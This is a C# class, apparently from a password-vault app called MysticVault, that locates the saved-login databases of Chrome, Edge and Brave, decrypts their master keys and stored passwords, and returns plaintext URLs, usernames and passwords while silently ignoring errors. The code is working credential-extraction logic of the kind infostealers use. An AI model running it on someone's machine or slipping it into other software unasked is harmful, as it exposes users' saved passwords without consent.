using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;
namespace MysticVault;
public record ExtractedCredential(string Url, string Username, string Password);
public class BrowserExtractor
{
    public static List<ExtractedCredential> ExtractAll()
    {
        var credentials = new List<ExtractedCredential>();
        var chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data");
        if (Directory.Exists(chromePath))
        {
            credentials.AddRange(ExtractFromBrowser(chromePath));
        }
        var edgePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data");
        if (Directory.Exists(edgePath))
        {
            credentials.AddRange(ExtractFromBrowser(edgePath));
        }
        try
        {
            credentials.AddRange(ZenExtractor.ExtractAll());
        }
        catch { }
        var bravePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"BraveSoftware\Brave-Browser\User Data");
        if (Directory.Exists(bravePath))
        {
            credentials.AddRange(ExtractFromBrowser(bravePath));
        }
        return credentials;
    }
    private static List<ExtractedCredential> ExtractFromBrowser(string userDataPath)
    {
        var results = new List<ExtractedCredential>();
        string localStatePath = Path.Combine(userDataPath, "Local State");
        string loginDataPath = Path.Combine(userDataPath, @"Default\Login Data");
        if (!File.Exists(localStatePath) || !File.Exists(loginDataPath))
            return results;
        byte[]? masterKey = GetMasterKey(localStatePath);
        if (masterKey == null)
            return results;
        string tempDbPath = Path.GetTempFileName();
        try
        {
            File.Copy(loginDataPath, tempDbPath, true);
            using var connection = new SqliteConnection($"Data Source={tempDbPath}");
            connection.Open();
            var command = connection.CreateCommand();
            command.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
            using var reader = command.ExecuteReader();
            while (reader.Read())
            {
                string url = reader.GetString(0);
                string username = reader.GetString(1);
                byte[] encryptedPassword = (byte[])reader.GetValue(2);
                if (encryptedPassword != null && encryptedPassword.Length > 0)
                {
                    string password = DecryptPassword(encryptedPassword, masterKey);
                    if (!string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(username))
                    {
                        results.Add(new ExtractedCredential(url, username, password));
                    }
                }
            }
        }
        catch (Exception)
        {
        }
        finally
        {
            if (File.Exists(tempDbPath))
            {
                try { File.Delete(tempDbPath); } catch { }
            }
        }
        return results;
    }
    private static byte[]? GetMasterKey(string localStatePath)
    {
        try
        {
            string content = File.ReadAllText(localStatePath);
            using var document = JsonDocument.Parse(content);
            if (document.RootElement.TryGetProperty("os_crypt", out var osCrypt) &&
                osCrypt.TryGetProperty("encrypted_key", out var encryptedKeyElement))
            {
                string encryptedKeyB64 = encryptedKeyElement.GetString() ?? "";
                byte[] encryptedKeyBytes = Convert.FromBase64String(encryptedKeyB64);
                byte[] dpapiEncryptedKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, dpapiEncryptedKey, 0, dpapiEncryptedKey.Length);
                return ProtectedData.Unprotect(dpapiEncryptedKey, null, DataProtectionScope.CurrentUser);
            }
        }
        catch
        {
        }
        return null;
    }
    private static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
    {
        try
        {
            if (encryptedData.Length >= 3 && encryptedData[0] == 'v' && 
                (encryptedData[1] == '1' && (encryptedData[2] == '0' || encryptedData[2] == '1')))
            {
                byte[] iv = new byte[12];
                Array.Copy(encryptedData, 3, iv, 0, 12);
                byte[] ciphertext = new byte[encryptedData.Length - 15 - 16];
                Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);
                byte[] tag = new byte[16];
                Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);
                byte[] plaintext = new byte[ciphertext.Length];
                using var aesGcm = new AesGcm(masterKey, tag.Length);
                aesGcm.Decrypt(iv, ciphertext, tag, plaintext);
                return Encoding.UTF8.GetString(plaintext);
            }
            else
            {
                byte[] plaintext = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                return Encoding.UTF8.GetString(plaintext);
            }
        }
        catch
        {
            return string.Empty;
        }
    }
}
